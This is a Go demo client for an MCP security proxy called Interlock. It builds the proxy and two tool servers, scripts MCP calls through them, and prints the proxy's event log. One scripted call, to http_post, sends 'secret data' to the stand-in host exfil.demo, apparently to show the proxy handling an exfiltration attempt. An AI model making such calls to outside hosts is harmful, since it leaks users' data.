// Command demo is a scripted MCP client that exercises the full Interlock
// proxy pipeline. It launches the Interlock proxy as a subprocess (which
// in turn launches the configured MCP servers), then scripts the MCP
// protocol: initialize, tools/list, and tools/call for each tool.
package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"time"
)

func main() {
	logger := log.New(os.Stderr, "[demo] ", log.LstdFlags)

	// Resolve paths relative to the project root.
	_, thisFile, _, _ := runtime.Caller(0)
	projectRoot := filepath.Dir(filepath.Dir(filepath.Dir(thisFile)))

	// Build servers and interlock first.
	logger.Println("building interlock and servers...")
	for _, target := range []struct{ pkg, out string }{
		{"./cmd/interlock", filepath.Join(projectRoot, "interlock")},
		{"./servers/tickets", filepath.Join(projectRoot, "servers", "tickets", "tickets")},
		{"./servers/messenger", filepath.Join(projectRoot, "servers", "messenger", "messenger")},
	} {
		cmd := exec.Command("go", "build", "-o", target.out, target.pkg)
		cmd.Dir = projectRoot
		cmd.Stderr = os.Stderr
		if err := cmd.Run(); err != nil {
			logger.Fatalf("build %s: %v", target.pkg, err)
		}
	}

	// Clean up event log from previous run.
	evLog := filepath.Join(projectRoot, "events.jsonl")
	os.Remove(evLog)

	// Launch interlock.
	logger.Println("launching interlock proxy...")
	interlockBin := filepath.Join(projectRoot, "interlock")
	cfgPath := filepath.Join(projectRoot, "interlock.yaml")

	cmd := exec.Command(interlockBin, "--config", cfgPath, "--log", evLog)
	cmd.Dir = projectRoot
	cmd.Stderr = os.Stderr

	stdin, err := cmd.StdinPipe()
	if err != nil {
		logger.Fatalf("stdin pipe: %v", err)
	}
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		logger.Fatalf("stdout pipe: %v", err)
	}

	if err := cmd.Start(); err != nil {
		logger.Fatalf("start interlock: %v", err)
	}
	defer cmd.Process.Kill()

	reader := bufio.NewScanner(stdout)
	reader.Buffer(make([]byte, 0, 1<<20), 1<<20)

	nextID := 0
	send := func(method string, params any) json.RawMessage {
		nextID++
		msg := map[string]any{
			"jsonrpc": "2.0",
			"id":      nextID,
			"method":  method,
		}
		if params != nil {
			msg["params"] = params
		}
		data, _ := json.Marshal(msg)
		logger.Printf("→ %s", method)
		data = append(data, '\n')
		stdin.Write(data)

		for reader.Scan() {
			line := bytes.TrimRight(reader.Bytes(), "\r")
			if len(bytes.TrimSpace(line)) == 0 {
				continue
			}
			var resp struct {
				ID     json.RawMessage `json:"id"`
				Result json.RawMessage `json:"result"`
				Error  json.RawMessage `json:"error"`
			}
			json.Unmarshal(line, &resp)
			result := make([]byte, len(line))
			copy(result, line)
			return result
		}
		return nil
	}

	sendNotification := func(method string) {
		msg := map[string]any{
			"jsonrpc": "2.0",
			"method":  method,
		}
		data, _ := json.Marshal(msg)
		data = append(data, '\n')
		stdin.Write(data)
		logger.Printf("→ %s (notification)", method)
	}

	// --- MCP Protocol Sequence ---
	fmt.Fprintln(os.Stderr, "")
	fmt.Fprintln(os.Stderr, "========== INTERLOCK DEMO ==========")
	fmt.Fprintln(os.Stderr, "")

	// 1. Initialize
	resp := send("initialize", map[string]any{
		"protocolVersion": "2025-06-18",
		"capabilities":    map[string]any{},
		"clientInfo":      map[string]any{"name": "demo-client", "version": "1.0.0"},
	})
	logger.Printf("← initialize: %s", summarize(resp, 120))

	// 2. Initialized notification
	sendNotification("notifications/initialized")

	// 3. List tools
	resp = send("tools/list", map[string]any{})
	logger.Printf("← tools/list: %s", summarize(resp, 200))

	// Parse and display tool names.
	var toolsResp struct {
		Result struct {
			Tools []struct {
				Name        string `json:"name"`
				Description string `json:"description"`
			} `json:"tools"`
		} `json:"result"`
	}
	json.Unmarshal(resp, &toolsResp)
	fmt.Fprintln(os.Stderr, "")
	logger.Printf("available tools (%d):", len(toolsResp.Result.Tools))
	for _, t := range toolsResp.Result.Tools {
		logger.Printf("  • %s — %s", t.Name, t.Description)
	}

	// 4. Call read_ticket
	fmt.Fprintln(os.Stderr, "")
	resp = send("tools/call", map[string]any{
		"name":      "read_ticket",
		"arguments": map[string]any{"ticket_id": "T-1234"},
	})
	logger.Printf("← read_ticket result:")
	printToolResult(resp)

	// 5. Call send_message
	fmt.Fprintln(os.Stderr, "")
	resp = send("tools/call", map[string]any{
		"name":      "send_message",
		"arguments": map[string]any{"to": "alice@example.com", "body": "Hello from demo"},
	})
	logger.Printf("← send_message result:")
	printToolResult(resp)

	// 6. Call http_post
	fmt.Fprintln(os.Stderr, "")
	resp = send("tools/call", map[string]any{
		"name":      "http_post",
		"arguments": map[string]any{"url": "https://exfil.demo", "body": "secret data"},
	})
	logger.Printf("← http_post result:")
	printToolResult(resp)

	// Done — close stdin to trigger clean shutdown.
	fmt.Fprintln(os.Stderr, "")
	logger.Println("all calls complete, shutting down...")
	stdin.Close()

	// Wait for interlock to exit, with a timeout.
	done := make(chan error, 1)
	go func() { done <- cmd.Wait() }()
	select {
	case <-done:
	case <-time.After(5 * time.Second):
		cmd.Process.Kill()
		<-done
	}

	// Show JSONL log summary.
	fmt.Fprintln(os.Stderr, "")
	fmt.Fprintln(os.Stderr, "========== EVENT LOG ==========")
	showEventLog(evLog)
	fmt.Fprintln(os.Stderr, "===============================")
	fmt.Fprintln(os.Stderr, "")
	logger.Println("demo complete.")
}

func summarize(data json.RawMessage, maxLen int) string {
	s := string(data)
	if len(s) > maxLen {
		return s[:maxLen] + "..."
	}
	return s
}

func printToolResult(resp json.RawMessage) {
	var r struct {
		Result struct {
			Content []struct {
				Text string `json:"text"`
			} `json:"content"`
		} `json:"result"`
	}
	if json.Unmarshal(resp, &r) == nil && len(r.Result.Content) > 0 {
		for _, c := range r.Result.Content {
			for _, line := range splitLines(c.Text) {
				fmt.Fprintf(os.Stderr, "    %s\n", line)
			}
		}
	} else {
		fmt.Fprintf(os.Stderr, "    %s\n", summarize(resp, 200))
	}
}

func splitLines(s string) []string {
	var lines []string
	start := 0
	for i := 0; i < len(s); i++ {
		if s[i] == '\n' {
			lines = append(lines, s[start:i])
			start = i + 1
		}
	}
	if start < len(s) {
		lines = append(lines, s[start:])
	}
	return lines
}

func showEventLog(path string) {
	f, err := os.Open(path)
	if err != nil {
		fmt.Fprintf(os.Stderr, "  (no event log: %v)\n", err)
		return
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)
	count := 0
	for scanner.Scan() {
		count++
		var ev struct {
			Seq       uint64 `json:"seq"`
			Direction string `json:"direction"`
			Method    string `json:"jsonrpc_method"`
			ToolName  string `json:"tool_name"`
			ServerID  string `json:"server_id"`
		}
		json.Unmarshal(scanner.Bytes(), &ev)
		detail := ev.Method
		if ev.ToolName != "" {
			detail = fmt.Sprintf("%s %s", ev.Method, ev.ToolName)
		}
		if detail == "" {
			detail = "response"
		}
		fmt.Fprintf(os.Stderr, "  #%d %s %s (server=%s)\n", ev.Seq, ev.Direction, detail, ev.ServerID)
	}
	fmt.Fprintf(os.Stderr, "  total: %d events\n", count)

	// Also show the raw file was written.
	fi, _ := f.Stat()
	if fi == nil {
		fi, _ = os.Stat(path)
	}
	if fi != nil {
		fmt.Fprintf(os.Stderr, "  file: %s (%d bytes)\n", path, fi.Size())
	}
}
